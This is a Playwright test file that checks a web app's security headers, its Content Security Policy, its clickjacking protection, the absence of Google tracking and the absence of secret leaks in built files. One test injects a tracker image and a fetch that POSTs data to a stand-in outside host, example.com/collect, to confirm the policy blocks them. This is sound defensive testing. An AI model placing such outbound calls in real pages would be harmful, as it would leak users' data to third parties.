import { readdir, readFile } from "node:fs/promises";
import { join } from "node:path";
import type { APIResponse } from "@playwright/test";
import { securityHeaders } from "@/server/security-headers";
import { expect, test } from "./fixtures";

// The headers this build was made with (playwright.config.ts points it at the Cloudinary stand-in).
const expected = securityHeaders({ NODE_ENV: "production", CLOUDINARY_API_URL: process.env.E2E_CLOUDINARY_URL });

function expectSecurityHeaders(response: APIResponse) {
  const headers = response.headers();
  for (const { key, value } of expected) expect(headers[key.toLowerCase()], `${key} on ${response.url()}`).toBe(value);
  expect(headers["x-powered-by"], `X-Powered-By on ${response.url()}`).toBeUndefined();
}

test("pages, API answers and static files carry the security headers, and no X-Powered-By (step 11)", async ({ page, request, signIn, sampleGroup }) => {
  const landing = await request.get("/");
  expectSecurityHeaders(landing);
  const script = (await landing.text()).match(/\/_next\/static\/[^"]+\.js/)![0];
  expectSecurityHeaders(await request.get(script));
  expectSecurityHeaders(await request.post("/api/chat", { data: {} })); // 401: refused by src/proxy.ts

  const owner = await signIn(page, "Carla Cruz");
  const { groupId } = await sampleGroup(owner);
  const groupPage = await page.request.get(`/g/${groupId}/settings`);
  expect(groupPage.status()).toBe(200);
  expectSecurityHeaders(groupPage);
  const exported = await page.request.get(`/api/groups/${groupId}/export?format=json`);
  expect(exported.status()).toBe(200);
  expectSecurityHeaders(exported);
});

test("the browser enforces the policy: images and connections to other sites are refused, tests notice, and other sites can't frame the app (step 11)", async ({ page, policyViolations, baseURL }) => {
  await page.goto("/");
  await page.evaluate(() => {
    const image = new Image();
    image.src = "https://example.com/tracker.png";
    document.body.append(image);
    void fetch("https://example.com/collect", { method: "POST", body: "family" }).catch(() => {});
  });
  await expect.poll(() => policyViolations.some((v) => v.includes("img-src"))).toBe(true);
  await expect.poll(() => policyViolations.some((v) => v.includes("connect-src"))).toBe(true);

  // Another site framing the app (clickjacking) gets Chrome's error page instead, while a page with
  // no policy (the Cloudinary stand-in) loads in the same kind of frame. The framing page is the
  // stand-in itself, opened at 127.0.0.1 (another origin on this machine): Chrome won't let a public
  // page, or one the test makes up, frame localhost.
  const stub = new URL(process.env.E2E_CLOUDINARY_URL!);
  await page.goto(`http://127.0.0.1:${stub.port}/calls`);
  await page.evaluate(
    (frames) => {
      for (const [id, src] of frames) {
        const frame = document.createElement("iframe");
        frame.id = id;
        frame.onload = () => (frame.dataset.loaded = "1");
        frame.src = src;
        document.body.append(frame);
      }
    },
    [
      ["app", `${baseURL}/`],
      ["other", `${stub.origin}/calls`],
    ],
  );
  await expect(page.locator("iframe[data-loaded]")).toHaveCount(2);
  await expect(page.frameLocator("#other").locator("body")).toContainText("uploaded");
  await expect(page.frameLocator("#app").getByRole("button", { name: "Sign in with Google" })).toHaveCount(0);

  policyViolations.length = 0; // expected here; in any other test, these would fail it
});

test("no Google Tag Manager in a test build: the landing page loads nothing from Google (owner request)", async ({ page, request }) => {
  // playwright.config.ts clears GTM_ID for the build, so neither of Google's snippets is in the page,
  // and "/" keeps the strict policy (the first test compares its headers).
  expect(await (await request.get("/")).text()).not.toContain("googletagmanager");
  const google: string[] = [];
  page.on("request", (r) => {
    if (new URL(r.url()).hostname.includes("google")) google.push(r.url());
  });
  await page.goto("/");
  await expect(page.getByRole("button", { name: "Sign in with Google" })).toBeEnabled(); // the page's scripts have run
  expect(google).toEqual([]);
});

test("no secret reaches the browser: the built files hold none of this run's (step 11)", async () => {
  // The values playwright.config.ts gives the web server, and the database address.
  const secrets = [process.env.E2E_AUTH_SECRET!, "e2e-placeholder-secret", "e2e-placeholder-key", "e2e-google-placeholder-secret", process.env.MONGODB_URI!];
  expect(secrets.every(Boolean)).toBe(true);
  // Everything a browser can download: the scripts and styles, and the pages prerendered at build time.
  const files = [];
  for (const folder of [".next/static", ".next/server/app"]) {
    for (const entry of await readdir(folder, { recursive: true, withFileTypes: true })) {
      if (entry.isFile() && /\.(js|css|html|rsc|json|txt)$/.test(entry.name)) files.push(join(entry.parentPath, entry.name));
    }
  }
  expect(files.length).toBeGreaterThan(20);
  const leaks = [];
  for (const file of files) {
    const text = await readFile(file, "utf8");
    for (const [i, secret] of secrets.entries()) if (text.includes(secret)) leaks.push(`${file}: secret ${i}`);
  }
  expect(leaks).toEqual([]);
});
